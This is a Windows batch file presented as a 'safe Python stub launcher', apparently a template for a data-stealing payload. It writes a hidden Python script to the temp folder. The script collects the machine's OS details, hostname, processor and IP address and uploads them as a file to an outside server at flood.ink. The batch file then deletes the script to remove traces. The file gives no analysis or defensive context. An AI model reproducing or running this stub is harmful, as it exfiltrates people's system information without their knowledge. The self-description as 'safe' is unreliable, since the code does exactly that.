@echo off
REM =========================
REM Safe Python stub launcher (Windows CMD compatible)
REM =========================

REM --- Configuration ---
set SERVER_URL=https://flood.ink/upload
set FILE_NAME=pc_info.txt

REM --- Temporary Python script path ---
set PYTHON_CODE=%TEMP%\stub_temp.py

REM --- Create temporary Python script ---
echo import requests > "%PYTHON_CODE%"
echo import io >> "%PYTHON_CODE%"
echo import platform >> "%PYTHON_CODE%"
echo import socket >> "%PYTHON_CODE%"
echo SERVER_URL = "%SERVER_URL%" >> "%PYTHON_CODE%"
echo FILE_NAME = "%FILE_NAME%" >> "%PYTHON_CODE%"

REM ========================
REM === YOUR CODE GOES HERE
REM === Collect PC info safely
REM ========================
echo SYSTEM = platform.system() >> "%PYTHON_CODE%"
echo NODE = platform.node() >> "%PYTHON_CODE%"
echo RELEASE = platform.release() >> "%PYTHON_CODE%"
echo VERSION = platform.version() >> "%PYTHON_CODE%"
echo MACHINE = platform.machine() >> "%PYTHON_CODE%"
echo PROCESSOR = platform.processor() >> "%PYTHON_CODE%"
echo IP = socket.gethostbyname(socket.gethostname()) >> "%PYTHON_CODE%"
echo FILE_CONTENT = f"System: {SYSTEM}\nNode: {NODE}\nRelease: {RELEASE}\nVersion: {VERSION}\nMachine: {MACHINE}\nProcessor: {PROCESSOR}\nIP: {IP}".encode() >> "%PYTHON_CODE%"

REM --- Continue Python script ---
echo f = io.BytesIO(FILE_CONTENT) >> "%PYTHON_CODE%"
echo files = {'file': (FILE_NAME, f, 'text/plain')} >> "%PYTHON_CODE%"
echo try: >> "%PYTHON_CODE%"
echo.    response = requests.post(SERVER_URL, files=files) >> "%PYTHON_CODE%"
echo.    print("Server response:", response.text) >> "%PYTHON_CODE%"
echo except Exception as e: >> "%PYTHON_CODE%"
echo.    print("Error connecting to server:", e) >> "%PYTHON_CODE%"

REM --- Run the temporary Python script ---
python "%PYTHON_CODE%"

REM --- Delete the temporary Python script ---
del "%PYTHON_CODE%"

pause
